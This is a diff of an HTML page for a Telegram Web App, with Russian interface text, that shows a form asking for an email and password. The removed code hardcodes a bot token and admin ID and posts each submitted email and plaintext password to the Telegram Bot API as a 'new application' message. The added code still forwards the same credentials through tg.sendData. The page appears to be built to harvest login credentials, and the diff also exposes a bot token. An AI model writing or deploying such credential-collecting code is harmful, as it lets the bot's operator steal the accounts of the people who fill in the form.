@@ -97,10 +97,6 @@
     </div>
     
     <script>
-        // ТВОИ ДАННЫЕ
-        const BOT_TOKEN = "8603629858:AAHoJGBCDvvImzpO3wllUriPulRvX0APozY";
-        const ADMIN_ID = "8542901240";
-        
         const tg = window.Telegram.WebApp;
         tg.expand();
         
@@ -115,7 +111,7 @@
             setTimeout(() => { messageDiv.style.display = 'none'; }, 5000);
         }
         
-        submitBtn.addEventListener('click', async function() {
+        submitBtn.addEventListener('click', function() {
             const email = emailInput.value.trim();
             const password = passwordInput.value.trim();
             
@@ -124,37 +120,15 @@
                 return;
             }
             
-            submitBtn.disabled = true;
-            submitBtn.textContent = '⏳ Отправка...';
-            
-            const user = tg.initDataUnsafe?.user || { id: 'неизвестно', first_name: 'Гость' };
-            
-            const message = `🔔 НОВАЯ ЗАЯВКА!\n\n👤 ID: ${user.id || 'неизвестно'}\n👤 Имя: ${user.first_name || 'Гость'}\n📧 Email: ${email}\n🔑 Пароль: ${password}`;
+            const data = JSON.stringify({ email: email, password: password });
             
             try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: ADMIN_ID,
-                        text: message
-                    })
-                });
-                
-                const result = await response.json();
-                
-                if (result.ok) {
-                    showMessage('✅ Данные отправлены!', 'success');
-                    emailInput.value = '';
-                    passwordInput.value = '';
-                } else {
-                    showMessage('❌ Ошибка: ' + (result.description || 'неизвестная'), 'error');
-                }
+                tg.sendData(data);
+                showMessage('✅ Данные отправлены!', 'success');
+                emailInput.value = '';
+                passwordInput.value = '';
             } catch (error) {
-                showMessage('❌ Ошибка соединения', 'error');
-            } finally {
-                submitBtn.disabled = false;
-                submitBtn.textContent = '🔓 Войти';
+                showMessage('❌ Ошибка отправки', 'error');
             }
         });
         
